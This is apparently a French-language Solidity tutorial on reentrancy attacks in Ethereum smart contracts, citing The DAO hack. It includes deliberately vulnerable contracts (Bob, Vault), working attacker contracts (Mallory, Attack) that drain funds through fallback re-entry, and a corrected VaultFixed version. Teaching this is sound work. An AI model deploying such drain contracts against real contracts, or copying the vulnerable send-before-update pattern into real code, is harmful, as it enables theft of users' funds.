/* 
  Réentrance - Reentrancy
Les attaques les plus connues sur Ethereum

Depuis le lancement de Ethereum, des centaines de milliers d'Ethers ont été perdus ou volés à cause de vulnérabilités sur les smart contracts. 
Nous allons aborder dans cette section les principales attaques connues. 

Nous avons tendance à penser que lorsqu'une fonction non récursive est invoquée, elle ne peut être ré-introduite avant sa fin. 
Cependant, ce n'est pas toujours le cas, car le mécanisme du fallback peut permettre à un attaquant d'accéder de nouveau à la fonction d'appel. 
Cela peut entraîner des comportements inattendus, et peut-être aussi des boucles d'invocations qui finissent par consommer tout le gas. 

Exemple :

Supposons que le contrat Bob est déjà sur la Blockchain, lorsque l'attaquant publie le contrat Mallory

 */

pragma solidity 0.8.7;

contract Bob {
  bool sent = false;
  function ping(address c) public {
      if(!sent){
          c.call{value: 2}("");
          sent = true;
      }
  }
}
contract Mallory{
  fallback () external {
      Bob(msg.sender).ping(address(this));
  }
}

/* 
  La fonction ping() dans le contrat Bob permet d’envoyer 2 weis à une address c, en utilisant un call avec une signature vide et 
  sans renseigner la valeur du “gas limit”. 

Supposons que, la fonction ping() a été appelée avec l’address du contrat Mallory. 

Comme mentionné avant, l’appel à la fonction call() a un second effet en appelant la fonction fallback de Mallory, 
qui appelle à son tour la fonction ping() encore une fois. Tant que la variable sent n’a pas la valeur true, 
le contrat Bob envoie 2 weis encore une fois au contrat Mallory et appelle encore une fois sa fonction fallback en formant une boucle. 

Cette boucle se termine lorsque l'exécution finit par lever une exception de “out-of-gas”, ou lorsque la taille limite de la pile est atteinte 
(voir la vulnérabilité "stack size limit"), ou lorsque Bob a été vidé de tous ses ethers. 

* Dans tous les cas, une exception est levée. Cependant, puisque la fonction call() ne propage pas l'exception, 
seuls les effets du dernier appel sont annulés, laissant tous les transferts d'Ethers précédents valides.

Cette vulnérabilité réside dans le fait que la fonction ping n'a pas été conçue pour être invoquée avant sa fin. 
En effet, cette vulnérabilité a été exploitée lors de l'attaque du smart contract THE DAO :

Le 17 juin 2016, le DAO a été piraté et 3,6 millions d'ethers (50 millions de dollars) ont été volés lors de la première attaque utilisant une réentrance.
La Fondation Ethereum a publié une mise à jour critique pour répondre au piratage. C'est ainsi que le réseau Ethereum a été séparé  
en Ethereum Classic et Ethereum (On parle de hard fork conflictuel).

https://web.archive.org/web/20210903185448/https://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/


Exemple : un simple contrat de stockage d’ether
Le code ci-dessous comporte une faille de réentrance :


 */

pragma solidity 0.8.7;

// You can store ETH in this contract and redeem them.
contract Vault {
    mapping(address => uint) public balances;

    /// @dev Store ETH in the contract.
    function store() public payable {
        balances[msg.sender]+=msg.value;
    }
    
    /// @dev Redeem your ETH.
    function redeem() public {
        msg.sender.call{ value: balances[msg.sender] }("");
        balances[msg.sender]=0;
    }
}

/* 
La faille vient de la fonction redeem et de l’ordre de appel. Ainsi on envoie les ethers à msg.sender avant de mettre sa balance à 0.

Alors l’attaquant a juste un appel à redeem à faire dans sa callback receive pour effectuer une réentrance.
 */

contract Attack {
    Vault public vault;

    constructor(address _vaultAddress) {
        vault = Vault(_vaultAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.redeem();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        vault.store{value: 1 ether}();   
        vault.redeem();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}


// On peut alors corriger le contrat en inversant l’ordre des appels de la fonction redeem :

// You can store ETH in this contract and redeem them.
contract VaultFixed {
    mapping(address => uint) public balances;

    /// @dev Store ETH in the contract.
    function store() public payable {
        balances[msg.sender]+=msg.value;
    }
    
    /// @dev Redeem your ETH.
    function redeem() public {
        uint toSend = balances[msg.sender];
        balances[msg.sender]=0;
		msg.sender.call{ value: toSend }("");
    }
}
